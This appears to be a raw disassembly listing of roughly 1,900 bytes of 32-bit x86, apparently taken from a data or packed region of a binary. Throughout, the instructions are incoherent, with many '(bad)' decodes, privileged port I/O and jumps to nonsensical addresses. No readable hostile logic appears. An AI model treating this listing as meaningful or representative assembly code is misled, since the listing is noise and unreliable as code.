  414d9a:	adc    eax,0xaaa91815
  414d9f:	in     al,dx
  414da0:	test   al,0xcd
  414da2:	jae    0x414d83
  414da4:	pop    ecx
  414da5:	aaa    
  414da6:	loope  0x414e0a
  414da8:	clc    
  414da9:	in     al,0x19
  414dab:	nop
  414dac:	xchg   esp,eax
  414dad:	xor    al,0x13
  414daf:	push   esp
  414db0:	gs std 
  414db2:	adc    esp,esp
  414db4:	sbb    DWORD PTR gs:[edx-0x1b],esi
  414db8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414db9:	jmp    0x99338fdb
  414dbe:	leave  
  414dbf:	dec    ecx
  414dc0:	(bad)  
  414dc1:	mov    ebp,0x623a3ec0
  414dc6:	mov    esi,0xea9feb7f
  414dcb:	in     al,dx
  414dcc:	mov    edx,0x4bd90608
  414dd1:	add    esi,edx
  414dd3:	add    BYTE PTR [edx],dl
  414dd5:	rcr    dh,cl
  414dd7:	add    dh,BYTE PTR [ebp+0x1e15b8b9]
  414ddd:	adc    dl,BYTE PTR [ebx-0x39]
  414de0:	aaa    
  414de1:	out    0xa7,al
  414de3:	leave  
  414de4:	loope  0x414e4a
  414de6:	retf   
  414de7:	js     0x414daf
  414de9:	pop    eax
  414dea:	mov    edx,0x20126b80
  414def:	loopne 0x414dd9
  414df1:	and    bl,BYTE PTR [esi-0x168143aa]
  414df7:	loope  0x414d7b
  414df9:	out    dx,eax
  414dfa:	mov    ebp,0x80236bad
  414dff:	mov    al,ds:0x472d5f7f
  414e04:	in     al,dx
  414e05:	imul   edx,DWORD PTR [edi],0x31
  414e08:	lahf   
  414e09:	jp     0x414e13
  414e0b:	or     bh,BYTE PTR ds:[edi]
  414e0e:	or     BYTE PTR [edx-0x41b8e9dc],0xa9
  414e15:	pop    edx
  414e16:	and    BYTE PTR [esi+0x69],cl
  414e19:	sub    edx,edi
  414e1b:	jo     0x414e72
  414e1d:	sub    edx,DWORD PTR [esi+0x609c052]
  414e23:	ret    0xb10d
  414e26:	arpl   WORD PTR [ecx-0x20c42721],ax
  414e2c:	fs pop ebx
  414e2e:	xchg   ecx,eax
  414e2f:	or     DWORD PTR [ebp+0x3],0x29c25115
  414e36:	mov    dh,0x1b
  414e38:	pop    ebp
  414e39:	cwde   
  414e3a:	sahf   
  414e3b:	pop    esi
  414e3c:	mov    edx,0xea96ef6b
  414e41:	sbb    dl,BYTE PTR [ebp+ebp*1-0x52]
  414e45:	in     eax,0x3d
  414e47:	dec    ebp
  414e48:	and    eax,0x33a48e6
  414e4d:	cmp    DWORD PTR [edx],edx
  414e4f:	xchg   edi,eax
  414e50:	jmp    0xa467a7b9
  414e55:	fs jbe 0x414e00
  414e58:	push   ecx
  414e59:	iret   
  414e5a:	mov    esp,0xe89bda5d
  414e5f:	xor    edx,edx
  414e61:	mov    ebx,0xba72a49
  414e66:	int    0x19
  414e68:	je     0x414eb1
  414e6a:	enter  0x9698,0x27
  414e6e:	out    dx,al
  414e6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e70:	push   edx
  414e71:	inc    ebx
  414e72:	rcr    ebx,1
  414e74:	shl    BYTE PTR [eax+0x5d],1
  414e77:	xor    dh,BYTE PTR [edx+0x4]
  414e7a:	lods   eax,DWORD PTR ds:[esi]
  414e7b:	sbb    WORD PTR [ebx+0x21785040],dx
  414e82:	add    al,0x5b
  414e85:	xchg   edx,eax
  414e86:	(bad)  
  414e88:	(bad)  
  414e89:	rcl    DWORD PTR [esi+0x1300bf38],cl
  414e8f:	jge    0x414eaf
  414e91:	into   
  414e92:	iret   
  414e93:	add    cl,BYTE PTR [ebx-0x25aa1a5e]
  414e99:	neg    BYTE PTR [eax+0x7e]
  414e9c:	mov    DWORD PTR [ecx-0x2a],0xfa97a76
  414ea3:	xor    DWORD PTR [esi-0x35f91e97],eax
  414ea9:	stc    
  414eaa:	inc    ebp
  414eab:	sbb    dl,al
  414ead:	mov    ch,0xc0
  414eaf:	fild   DWORD PTR [ebp-0x78]
  414eb2:	bound  esi,QWORD PTR [ecx]
  414eb4:	xchg   edi,eax
  414eb5:	cmp    al,0x5f
  414eb7:	jg     0x414e95
  414eb9:	into   
  414eba:	imul   ebx,DWORD PTR [edi],0xffffffa8
  414ebd:	sbb    al,0x5a
  414ebf:	retf   
  414ec0:	sbb    eax,0xa588afe5
  414ec5:	dec    esp
  414ec6:	and    eax,0xf9056567
  414ecb:	add    eax,0x2bec7073
  414ed0:	push   0x7486e57c
  414ed5:	sbb    BYTE PTR [edi+edi*4],ch
  414ed8:	adc    DWORD PTR [ebp+0x282534d5],edi
  414ede:	xchg   ebp,eax
  414edf:	add    dh,cl
  414ee1:	sbb    DWORD PTR [eax+ebx*4-0x36],0x3cec9113
  414ee9:	jb     0x414e91
  414eeb:	or     ch,0xe3
  414eee:	mov    DWORD PTR [edi-0x816df96],esp
  414ef4:	cmp    BYTE PTR [edx],0x41
  414ef7:	ds pop ds
  414ef9:	xor    al,0xb1
  414efb:	int    0xc2
  414efd:	fs dec edi
  414eff:	bswap  edi
  414f01:	or     al,0xb7
  414f03:	nop/reserved BYTE PTR [edi]
  414f06:	scas   al,BYTE PTR es:[edi]
  414f07:	popf   
  414f08:	sub    al,0x43
  414f0a:	pushf  
  414f0b:	jns    0x414ebd
  414f0d:	shl    BYTE PTR [ebp+0xda35c35],1
  414f13:	dec    ebp
  414f14:	inc    esp
  414f15:	dec    ebp
  414f16:	jns    0x414eb1
  414f18:	outs   dx,BYTE PTR ds:[esi]
  414f19:	adc    eax,0xadd8fd6e
  414f1e:	ficom  WORD PTR [edi+ebp*4-0x4f]
  414f22:	adc    ebx,ecx
  414f24:	xchg   ecx,eax
  414f25:	xor    al,0x65
  414f27:	cs (bad) 
  414f29:	and    al,0xa6
  414f2b:	and    BYTE PTR [edi+0x7b],dl
  414f2e:	jnp    0x414f09
  414f30:	outs   dx,BYTE PTR ds:[esi]
  414f31:	outs   dx,BYTE PTR ds:[esi]
  414f32:	out    dx,eax
  414f33:	pop    es
  414f34:	cwde   
  414f35:	xor    eax,0xe7f33e70
  414f3a:	retf   
  414f3b:	repnz adc eax,0x12af23d7
  414f41:	mov    eax,0x28528c74
  414f46:	sahf   
  414f47:	mov    ch,BYTE PTR [edi+0x58]
  414f4a:	xor    edx,DWORD PTR [ecx]
  414f4c:	ret    
  414f4d:	mov    ah,0x1b
  414f4f:	xchg   BYTE PTR [eax+0x7a0b4137],dl
  414f55:	(bad)  
  414f56:	fs mov esi,0xfcdc4875
  414f5c:	aaa    
  414f5d:	cmp    eax,0x522b80c9
  414f62:	bound  ebx,QWORD PTR [ecx+0xb]
  414f65:	mov    al,cl
  414f67:	cli    
  414f68:	mov    WORD PTR [ebp+0x5c088f6d],ds
  414f6e:	es sbb eax,0x3661eb45
  414f74:	in     al,0x9d
  414f76:	add    dl,BYTE PTR [esi+ebx*1+0x77]
  414f7a:	in     al,0x5
  414f7c:	cmp    eax,0x8d747780
  414f81:	cdq    
  414f82:	pop    ebp
  414f83:	add    al,0xd5
  414f85:	or     edx,DWORD PTR [ebx+0x59]
  414f88:	repnz aad 0xa6
  414f8b:	rol    BYTE PTR [ecx+0x2d78dced],cl
  414f91:	sub    eax,0x3f4b5bf7
  414f96:	xor    al,0x43
  414f98:	sbb    eax,0x7028d12f
  414f9d:	stos   DWORD PTR es:[edi],eax
  414f9e:	mov    eax,0x3b3d568e
  414fa3:	or     DWORD PTR [ebx+0x1e80161b],edi
  414fa9:	js     0x414fcd
  414fab:	push   ecx
  414fac:	mov    BYTE PTR [ebx-0x34d98c0b],dl
  414fb2:	xor    BYTE PTR [ebp+0x365032f8],ch
  414fb8:	(bad)  
  414fb9:	push   0x2df8d55d
  414fbe:	mov    es,ebp
  414fc0:	pushf  
  414fc1:	jae    0x41501d
  414fc3:	repz jmp FWORD PTR cs:[ebp-0x7156a096]
  414fcb:	cdq    
  414fcc:	dec    edi
  414fcd:	fwait
  414fce:	jp     0x414fee
  414fd0:	(bad)
  414fd4:	imul   edi,DWORD PTR [edx],0x23
  414fd7:	icebp  
  414fd8:	sar    eax,cl
  414fda:	out    dx,al
  414fdb:	inc    esp
  414fdc:	repz and eax,0xaf308ad1
  414fe2:	pop    eax
  414fe3:	mov    edi,0x334ced98
  414fe8:	inc    DWORD PTR [edi+eiz*1+0x6c43d8db]
  414fef:	test   BYTE PTR [eax+0x61],cl
  414ff2:	retf   
  414ff3:	pusha  
  414ff4:	or     ebp,DWORD PTR [ebx-0x28]
  414ff7:	call   0x456e:0x33fe9c42
  414ffe:	xchg   DWORD PTR [esi],esi
  415000:	sti    
  415001:	pusha  
  415002:	push   cs
  415003:	push   ebx
  415004:	mov    al,0x36
  415006:	push   ss
  415007:	arpl   WORD PTR [edx],di
  415009:	cmp    al,0xfa
  41500b:	jae    0x414fcd
  41500d:	jp     0x415046
  41500f:	in     al,dx
  415010:	mov    ah,0x3d
  415012:	sti    
  415013:	mov    ecx,0x5ef0e6c6
  415018:	xor    BYTE PTR [esi+esi*8],0xa9
  41501c:	mov    dl,0x46
  41501e:	call   0x6441:0xa539aa7
  415025:	hlt    
  415026:	shl    DWORD PTR [ebx+0x68],0x9
  41502a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41502b:	dec    edi
  41502c:	loopne 0x415044
  41502e:	bnd jb 0x415036
  415031:	mov    WORD PTR [ecx-0x72],?
  415034:	das    
  415035:	(bad)  
  415038:	fld    TBYTE PTR [ebx]
  41503a:	jbe    0x415019
  41503c:	add    eax,0x99f5569a
  415041:	imul   esp,edx,0xc01d0e90
  415047:	loopne 0x415008
  415049:	jg     0x415017
  41504b:	xchg   edx,eax
  41504c:	aaa    
  41504d:	mov    edi,0xc9043320
  415052:	loopne 0x4150cb
  415054:	xchg   ecx,eax
  415055:	rcr    DWORD PTR [edx+0x2f88cd07],cl
  41505b:	(bad)  
  41505c:	enter  0x978e,0xf
  415060:	aam    0xb5
  415062:	sub    BYTE PTR [edx+edx*8],ah
  415065:	add    eax,0x40b14cd
  41506a:	push   edi
  41506b:	push   esp
  41506c:	and    eax,0x7e49bcb5
  415071:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415072:	fstp   QWORD PTR [edi+0x4f]
  415075:	lods   eax,DWORD PTR ds:[esi]
  415076:	inc    eax
  415077:	fdiv   DWORD PTR es:[ebp-0x4d8798c9]
  41507e:	data16 fs je 0x4150c6
  415082:	daa    
  415083:	add    ebx,ebp
  415085:	rcr    BYTE PTR [edi+0x7734e03a],cl
  41508b:	dec    edi
  41508c:	pop    esi
  41508d:	adc    edi,DWORD PTR [esi-0x3492723a]
  415093:	int3   
  415094:	gs pop ecx
  415096:	mov    al,0xd9
  415098:	dec    esp
  415099:	mov    DWORD PTR [esi+eax*2+0x701d5ccc],esp
  4150a0:	es adc eax,0x1fd7f569
  4150a6:	jmp    0x4150ca
  4150a8:	(bad)  
  4150aa:	fs in  eax,dx
  4150ac:	and    DWORD PTR [esi+0x7fd7ef8f],esi
  4150b2:	jl     0x4150cd
  4150b4:	ins    BYTE PTR es:[edi],dx
  4150b5:	(bad)
  4150b9:	rcr    BYTE PTR [esi],cl
  4150bb:	inc    esi
  4150bc:	or     al,0x99
  4150be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150bf:	jecxz  0x41505f
  4150c1:	lock mov bl,0xe1
  4150c4:	popf   
  4150c5:	adc    ecx,esi
  4150c7:	xchg   edi,eax
  4150c8:	or     DWORD PTR [ebp+0x2f],esp
  4150cb:	pop    ecx
  4150cc:	sbb    BYTE PTR [ecx-0x48],dl
  4150cf:	sti    
  4150d0:	outs   dx,BYTE PTR ds:[esi]
  4150d1:	jno    0x415122
  4150d3:	(bad)  
  4150d4:	jb     0x415062
  4150d6:	push   esp
  4150d7:	icebp  
  4150d8:	enter  0xc35d,0xe7
  4150dc:	sbb    ecx,eax
  4150de:	adc    eax,0x92776130
  4150e3:	add    ecx,DWORD PTR [ebx]
  4150e5:	pop    edx
  4150e6:	(bad)  
  4150e7:	or     eax,0x608df298
  4150ec:	aas    
  4150ed:	jmp    0x4150e7
  4150ef:	cmp    dl,BYTE PTR [edx]
  4150f1:	or     ah,BYTE PTR [ebx+0x608d8b61]
  4150f7:	pop    edi
  4150f8:	addr16 repnz push eax
  4150fb:	or     BYTE PTR [esi],ch
  4150fd:	int3   
  4150fe:	push   edx
  4150ff:	push   ds
  415100:	mov    bh,0xf1
  415102:	mov    ch,0x3
  415104:	mov    eax,ds:0xd026428a
  415109:	sar    BYTE PTR [edx-0x14bd9d20],0x5
  415110:	test   DWORD PTR [ebp+0x3a6aa729],ebx
  415116:	mov    edx,0xafb3d1c5
  41511b:	xor    eax,0x221dc59d
  415120:	inc    DWORD PTR [eax]
  415122:	lahf   
  415123:	clc    
  415124:	je     0x415105
  415126:	lock push ecx
  415128:	sub    BYTE PTR [edi],dh
  41512a:	pop    ebp
  41512b:	inc    esp
  41512c:	(bad)  
  41512d:	push   edx
  41512e:	lds    edi,FWORD PTR [ebx-0x48]
  415131:	mov    edx,0xef7974f1
  415136:	mov    esi,0xb05a3112
  41513b:	mov    ebp,0x17d43f70
  415140:	mov    bl,dl
  415142:	adc    DWORD PTR [eax],edi
  415144:	cmp    eax,DWORD PTR [edx-0x2bab21bd]
  41514a:	inc    edi
  41514b:	nop
  41514c:	mov    ah,0xc6
  41514e:	xor    edi,DWORD PTR [edi+0x11]
  415151:	and    ecx,esp
  415153:	leave  
  415154:	popa   
  415155:	or     al,0xb8
  415157:	push   eax
  415158:	xchg   edi,eax
  415159:	pop    esi
  41515a:	out    dx,eax
  41515b:	xchg   BYTE PTR [edx],cl
  41515d:	enter  0x4f6f,0x6f
  415161:	cld    
  415162:	sub    cl,BYTE PTR [edx+0x56ba0725]
  415168:	aaa    
  415169:	enter  0xaf64,0x33
  41516d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41516e:	jl     0x4151c9
  415170:	xor    ebx,esi
  415172:	retf   
  415173:	xchg   edx,eax
  415174:	loop   0x415163
  415176:	ficomp WORD PTR [edx+0x60]
  415179:	push   0x1d
  41517b:	add    al,0x5a
  41517d:	call   0x30ba7920
  415182:	cmp    ecx,ecx
  415184:	shr    bh,0xa6
  415187:	and    al,cl
  415189:	loope  0x41515f
  41518b:	push   0x2b
  41518d:	inc    ebp
  41518e:	sbb    eax,0x8ef92c76
  415193:	dec    esi
  415194:	retf   
  415195:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415196:	pop    ss
  415197:	or     al,0x57
  415199:	sub    cl,cl
  41519b:	jb     0x4151b4
  41519d:	jb     0x415144
  41519f:	repz fadd st,st(2)
  4151a2:	jle    0x415182
  4151a4:	aas    
  4151a5:	call   0xc700:0x6bf7c07
  4151ac:	adc    ah,ch
  4151ae:	dec    edi
  4151af:	sbb    edi,eax
  4151b1:	mov    esp,DWORD PTR [edi+0x5c]
  4151b4:	ds dec esi
  4151b6:	mov    esp,0xc4bbfa39
  4151bb:	clc    
  4151bc:	pop    ebx
  4151bd:	jecxz  0x4151d1
  4151bf:	cmc    
  4151c0:	sub    al,0xe7
  4151c2:	in     eax,dx
  4151c3:	int    0x6f
  4151c5:	(bad)  
  4151c7:	adc    eax,DWORD PTR [ebp-0x1d]
  4151ca:	pop    ecx
  4151cb:	in     al,dx
  4151cc:	scas   eax,DWORD PTR es:[edi]
  4151cd:	dec    eax
  4151ce:	retf   0xdf18
  4151d1:	retf   0xa267
  4151d4:	(bad)  
  4151d5:	xor    BYTE PTR [ecx+0xdfda951],dl
  4151db:	push   es
  4151dc:	push   edx
  4151dd:	scas   eax,DWORD PTR es:[edi]
  4151de:	xor    dh,BYTE PTR [edi-0x2087a29c]
  4151e4:	in     eax,dx
  4151e5:	xchg   ebx,eax
  4151e6:	pop    ebx
  4151e7:	pop    ds
  4151e8:	and    edx,DWORD PTR [edi]
  4151ea:	shl    BYTE PTR [ebx+0x25761896],1
  4151f0:	xchg   esp,eax
  4151f1:	mov    BYTE PTR [esi+0x372976ec],bl
  4151f7:	pop    ebp
  4151f8:	clc    
  4151f9:	mov    al,0xab
  4151fb:	inc    ebp
  4151fc:	loope  0x4151a8
  4151fe:	lds    ecx,FWORD PTR [eax]
  415200:	add    al,0xf5
  415202:	clc    
  415203:	scas   al,BYTE PTR es:[edi]
  415204:	sub    edi,DWORD PTR ss:[eax]
  415207:	mov    DWORD PTR [eax+0x1d],0x4f466ab
  41520e:	pop    edx
  41520f:	or     eax,0x9653d1b0
  415214:	xor    ch,BYTE PTR [esi]
  415216:	push   ds
  415217:	cmp    esp,DWORD PTR [ecx]
  415219:	mov    cl,0x50
  41521b:	push   esp
  41521c:	cdq    
  41521d:	into   
  41521e:	jge    0x41529e
  415220:	fsub   DWORD PTR [esi+0x4e]
  415223:	jbe    0x4151b0
  415225:	das    
  415226:	and    al,0x93
  415228:	xchg   edi,eax
  415229:	inc    ebp
  41522a:	les    ecx,FWORD PTR [edx+0x1e]
  41522d:	xor    BYTE PTR [edx],bh
  41522f:	inc    ebp
  415230:	add    bl,bl
  415232:	adc    ebp,DWORD PTR [ebx]
  415234:	add    bh,BYTE PTR [esi]
  415236:	push   cs
  415237:	dec    esi
  415238:	pop    ecx
  415239:	(bad)  
  41523a:	xor    ecx,DWORD PTR [edx-0x295f8d97]
  415240:	dec    esp
  415241:	pop    esi
  415242:	mov    eax,ds:0x6dcbb378
  415247:	inc    esp
  415248:	xchg   esi,eax
  415249:	test   BYTE PTR [edi],0xd9
  41524c:	add    dl,dh
  41524e:	xor    ch,BYTE PTR fs:[esi]
  415251:	inc    edx
  415252:	jle    0x415282
  415254:	scas   eax,DWORD PTR es:[edi]
  415255:	mov    al,ds:0xfb349a06
  41525a:	dec    eax
  41525b:	pusha  
  41525c:	test   ecx,ebp
  41525e:	jmp    0x811ee171
  415263:	add    BYTE PTR [ecx+0x5999d463],ch
  415269:	mov    esp,0xc08016e0
  41526e:	ins    BYTE PTR es:[edi],dx
  41526f:	add    BYTE PTR [esi-0x78],ah
  415272:	loopne 0x41525a
  415274:	push   edx
  415275:	in     eax,0xdf
  415277:	cmp    cl,bl
  415279:	xor    eax,0x8b8377b3
  41527e:	out    dx,al
  41527f:	jbe    0x4152b0
  415281:	ficomp WORD PTR [esi-0x1efa31c3]
  415287:	je     0x415267
  415289:	jl     0x415215
  41528b:	ret    0x8a0b
  41528e:	inc    ebx
  41528f:	and    dl,cl
  415291:	ins    DWORD PTR es:[edi],dx
  415292:	pop    ss
  415293:	jb     0x4152b6
  415295:	xlat   BYTE PTR ds:[ebx]
  415296:	sbb    dl,BYTE PTR [esi]
  415298:	pusha  
  415299:	test   DWORD PTR [edx-0x19],esp
  41529c:	pop    es
  41529d:	loope  0x41522a
  41529f:	dec    ecx
  4152a0:	mov    ds:0x7c0cca98,eax
  4152a5:	push   ebp
  4152a6:	stc    
  4152a7:	outs   dx,BYTE PTR ds:[esi]
  4152a8:	iret   
  4152a9:	icebp  
  4152aa:	cmc    
  4152ab:	xchg   esi,eax
  4152ac:	aaa    
  4152ad:	dec    edx
  4152ae:	xchg   ebp,eax
  4152af:	loopne 0x41529d
  4152b1:	call   0x7c0dba17
  4152b6:	cdq    
  4152b7:	inc    ebp
  4152b8:	and    dl,BYTE PTR [ecx]
  4152ba:	push   ebp
  4152bb:	mov    al,0xfd
  4152bd:	(bad)  
  4152be:	aad    0xef
  4152c0:	(bad)  
  4152c1:	jae    0x41529f
  4152c3:	adc    eax,0xa18ed118
  4152c8:	mov    bh,0xda
  4152ca:	imul   edi,edx,0xfffffff4
  4152cd:	call   0xf75b:0x7b03ade7
  4152d4:	sub    DWORD PTR [ecx],0xffffff84
  4152d7:	pop    ecx
  4152d8:	inc    ecx
  4152d9:	imul   ecx,DWORD PTR [edx+ebx*8+0xead0b60],0x5217d3c3
  4152e4:	shl    DWORD PTR [esi+eiz*2],0x3e
  4152e8:	adc    BYTE PTR ds:0x4e585871,ah
  4152ee:	jp     0x415347
  4152f0:	mov    bh,0xb1
  4152f2:	mov    eax,0xa49fd04e
  4152f7:	lods   eax,DWORD PTR ds:[esi]
  4152f8:	sti    
  4152f9:	sar    BYTE PTR [ecx-0x59],1
  4152fc:	sbb    edx,edx
  4152fe:	mov    ch,0xbe
  415300:	xor    ecx,DWORD PTR ds:0x40326bea
  415306:	pop    ebx
  415308:	fsubr  st,st(1)
  41530a:	loop   0x4152fd
  41530c:	popa   
  41530d:	xor    DWORD PTR [ebx+0x66],esp
  415310:	in     eax,dx
  415311:	jmp    0x4152e6
  415313:	dec    esi
  415314:	or     bh,al
  415316:	leave  
  415317:	cdq    
  415318:	out    dx,al
  415319:	cdq    
  41531a:	lods   al,BYTE PTR ds:[esi]
  41531b:	mov    ecx,0xd4524c9a
  415320:	enter  0x323e,0x6
  415324:	ja     0x415316
  415326:	jp     0x4152dc
  415328:	jbe    0x4152c9
  41532a:	dec    BYTE PTR ds:0x6fb851f
  415330:	retf   
  415331:	xor    edx,esi
  415333:	dec    esi
  415334:	cmp    bp,WORD PTR [esi]
  415337:	pop    esp
  415338:	and    BYTE PTR fs:[esi-0x17],ch
  41533c:	mov    ebx,0xce5065c7
  415341:	and    BYTE PTR [eax-0x15fd0863],bh
  415347:	jl     0x4152e9
  415349:	pusha  
  41534a:	lods   eax,DWORD PTR ds:[esi]
  41534b:	dec    ebx
  41534c:	mov    cl,BYTE PTR [edi-0x4a]
  41534f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415350:	sbb    BYTE PTR [edx],bh
  415352:	inc    edi
  415353:	iret   
  415354:	ins    DWORD PTR es:[edi],dx
  415355:	inc    ecx
  415356:	inc    esp
  415357:	add    DWORD PTR [ebx],ecx
  415359:	cmp    dl,BYTE PTR [esi+ebp*8+0x4f4de5ae]
  415360:	sub    eax,0x312c7125
  415365:	xchg   esi,eax
  415366:	xor    ah,BYTE PTR [ecx-0x18]
  415369:	jle    0x415394
  41536b:	nop
  41536c:	retf   
  41536d:	out    dx,eax
  41536e:	dec    eax
  41536f:	std    
  415370:	aas    
  415371:	or     BYTE PTR [ecx],ah
  415373:	out    dx,eax
  415374:	or     bl,cl
  415376:	dec    ebp
  415377:	loope  0x4153d8
  415379:	dec    edi
  41537a:	xor    al,0x9f
  41537c:	int3   
  41537d:	dec    esi
  41537e:	(bad)
  415381:	aam    0x44
  415383:	mov    edi,edx
  415385:	enter  0x9d3e,0xd9
  415389:	sub    eax,0x98b9ccd4
  41538e:	inc    esi
  41538f:	jecxz  0x415403
  415391:	mov    bh,0xb9
  415393:	jg     0x4153ec
  415395:	mov    gs,WORD PTR [esi]
  415397:	repz push esp
  415399:	js     0x415373
  41539b:	jl     0x41532d
  41539d:	xor    BYTE PTR es:[edx-0x10],dl
  4153a1:	rcl    BYTE PTR [edx-0x22],0x3d
  4153a5:	loope  0x4153c1
  4153a7:	mov    edi,0x2ca802bb
  4153ac:	das    
  4153ad:	xchg   ebp,eax
  4153ae:	(bad)  
  4153b0:	add    dh,BYTE PTR [edx+0x6bd9e0b9]
  4153b6:	ja     0x4153d9
  4153b8:	adc    DWORD PTR [ecx+0x2e],esi
  4153bb:	mov    cl,0x15
  4153bd:	fcom   DWORD PTR [esi+0x59]
  4153c0:	cmp    ch,BYTE PTR gs:[esp+ecx*8-0x1b]
  4153c5:	and    al,0xe0
  4153c7:	hlt    
  4153c8:	xchg   ebp,eax
  4153c9:	sbb    eax,0x9de98143
  4153ce:	data16 sbb al,0x25
  4153d1:	push   eax
  4153d2:	(bad)  
  4153d3:	and    ecx,ebp
  4153d5:	cmp    bl,bl
  4153d7:	push   ss
  4153d8:	pop    edi
  4153d9:	jmp    0xd981:0xbc2d05fc
  4153e0:	and    DWORD PTR [esi],esi
  4153e2:	xchg   edi,eax
  4153e3:	aas    
  4153e4:	jmp    0x41538a
  4153e6:	jne    0x415399
  4153e8:	clts   
  4153ea:	sub    DWORD PTR [ebx],ebp
  4153ec:	scas   eax,DWORD PTR es:[edi]
  4153ed:	or     eax,DWORD PTR [edi]
  4153ef:	loope  0x4153b4
  4153f1:	in     eax,0xc
  4153f3:	mov    cl,0x60
  4153f5:	int3   
  4153f6:	scas   eax,DWORD PTR es:[edi]
  4153f7:	test   cl,0x1f
  4153fa:	push   edi
  4153fb:	nop
  4153fc:	jl     0x41545f
  4153fe:	les    ebx,FWORD PTR [ebx+0x8e43b37]
  415404:	jns    0x4153b5
  415406:	mov    dh,0xc1
  415408:	hlt    
  415409:	xor    ebp,DWORD PTR [ebx+0x6f]
  41540c:	push   edi
  41540d:	jg     0x415411
  41540f:	inc    esi
  415410:	scas   al,BYTE PTR es:[edi]
  415411:	scas   al,BYTE PTR es:[edi]
  415412:	pop    eax
  415413:	cmp    eax,0xad632f68
  415418:	cmp    al,0x6c
  41541a:	test   BYTE PTR [ecx],dh
  41541c:	dec    edx
  41541d:	not    esi
  41541f:	outs   dx,DWORD PTR ds:[esi]
  415420:	and    al,BYTE PTR [edi+0x5]
  415423:	mov    dl,0x0
  415425:	in     eax,0x75
  415427:	test   al,0x85
  415429:	jb     0x4153cf
  41542b:	stos   BYTE PTR es:[edi],al
  41542c:	enter  0xcad1,0x12
  415430:	add    DWORD PTR [ebx-0x16fb1afd],edx
  415436:	jg     0x415423
  415438:	and    ebp,ebx
  41543a:	push   ds
  41543b:	and    al,0x64
  41543d:	add    al,0xb8
  41543f:	fwait
  415440:	sbb    BYTE PTR [edx+0x2],cl
  415443:	aam    0x1
  415445:	(bad)  
  415446:	stc    
  415447:	adc    bh,ch
  415449:	retf   
  41544a:	adc    al,0xc8
  41544c:	sbb    eax,ebp
  41544e:	aaa    
  41544f:	mov    ebx,es
  415451:	xchg   ecx,ebp
  415453:	sbb    cl,BYTE PTR [edi+0x43]
  415456:	sti    
  415457:	(bad)  
  415458:	adc    DWORD PTR [eax+0x78b7ecde],ebp
  41545e:	outs   dx,DWORD PTR ds:[esi]
  41545f:	lods   al,BYTE PTR ds:[esi]
  415460:	add    edi,ebx
  415462:	aaa    
  415463:	sub    eax,0x936cb570
  415468:	popf   
  415469:	sub    eax,0x9f800da6
  41546e:	jno    0x415417
  415470:	pop    edi
  415471:	sub    DWORD PTR [esi+0x28adb739],eax
  415477:	scas   eax,DWORD PTR es:[edi]
  415478:	pop    esp
  415479:	lahf   
  41547a:	sti    
  41547b:	imul   esi,DWORD PTR [ebx+ebp*8+0x21],0xcc77ed58
  415483:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415484:	jle    0x415467
  415486:	xor    ebp,0x55
  415489:	push   edi
  41548a:	mov    dl,0x56
  41548c:	mov    dl,0xa4
  41548e:	mov    dh,0x82
  415490:	scas   al,BYTE PTR es:[edi]
  415491:	lods   eax,DWORD PTR ds:[esi]
  415492:	inc    edi
  415493:	ret    
  415494:	pop    eax
  415495:	push   ss
  415496:	retf   
  415497:	push   edi
  415498:	in     eax,0x24
  41549a:	sbb    eax,0x1c34c57
  41549f:	aas    
  4154a0:	mov    eax,ds:0x8bad51e2
  4154a5:	fst    QWORD PTR fs:[ecx-0xb]
  4154a9:	sbb    al,0x29
  4154ab:	xlat   BYTE PTR ds:[ebx]
  4154ac:	scas   eax,DWORD PTR es:[edi]
  4154ad:	dec    ecx
  4154ae:	jns    0x4154b5
  4154b0:	(bad)  
  4154b2:	mov    eax,0x436bf20b
  4154b7:	in     eax,dx
  4154b8:	mov    al,0x76
  4154ba:	stos   DWORD PTR es:[edi],eax
  4154bb:	aas    
  4154bc:	mov    esi,0xc234f06f
  4154c1:	or     BYTE PTR [edi+edx*8+0x7e],ah
  4154c5:	jno    0x415489
  4154c7:	retf   0xc917
  4154ca:	xlat   BYTE PTR fs:[ebx]
  4154cc:	xor    al,0x5d
  4154ce:	stos   DWORD PTR es:[edi],eax
  4154cf:	add    eax,0x45d4f8fa
  4154d4:	adc    al,0xd1
  4154d6:	div    al
  4154d8:	inc    ebp
  4154d9:	push   ebx
  4154da:	sbb    ebp,esi
  4154dc:	sub    esp,DWORD PTR [eax+0x40747066]
  4154e2:	mov    bh,0x24
  4154e4:	inc    edi
  4154e5:	sahf   
  4154e6:	mov    esi,0xf0c3a02f
  4154eb:	pop    edx
  4154ec:	xchg   esp,eax
  4154ed:	xchg   esi,eax
  4154ee:	and    al,0xbd
  4154f0:	sub    ebx,DWORD PTR [edi]
  4154f2:	call   0xe8f2:0x2dc3db1f
  4154f9:	mov    bl,0xce
  4154fb:	sub    DWORD PTR [esi+0x1f],ebx
  4154fe:	push   0x97510f2e
  415503:	jo     0x4154fd
  415505:	adc    eax,0x4032de65
  41550a:	xor    BYTE PTR [edx-0x2b],bl
  41550d:	cmp    edi,0x7706f673
  415513:	dec    eax
  415514:	out    dx,al
  415515:	sbb    BYTE PTR [ebx-0xddb128e],dl
  41551b:	std    
  41551c:	in     al,dx
  41551d:	or     dl,BYTE PTR [ebx-0x270abe7c]
  415523:	ds out dx,al
  415525:	data16 (bad) 
  415527:	jno    0x415581
  415529:	jmp    DWORD PTR [eax]
  41552b:	mov    esi,0xf1aecad3
  415530:	cmp    bl,BYTE PTR [edi-0x61bd15ab]
  415536:	repz icebp 
  415538:	mov    edx,0xd6ed11da
  41553d:	cdq    
  41553e:	push   0x2
  415540:	xchg   edi,eax
  415541:	inc    ebx
  415542:	mov    edx,0x970ec8d2
  415547:	int3   
  415548:	(bad)  
  415549:	cmp    esp,DWORD PTR [esi+0x76]
  41554c:	gs scas eax,DWORD PTR es:[edi]
  41554e:	sub    eax,0x40295cb7
  415553:	inc    ebp
  415554:	pop    ecx
  415555:	out    dx,al
  415556:	je     0x4155a1
  415558:	sub    esi,DWORD PTR [esi-0x6a]
  41555b:	sbb    BYTE PTR [edx-0x2c],al
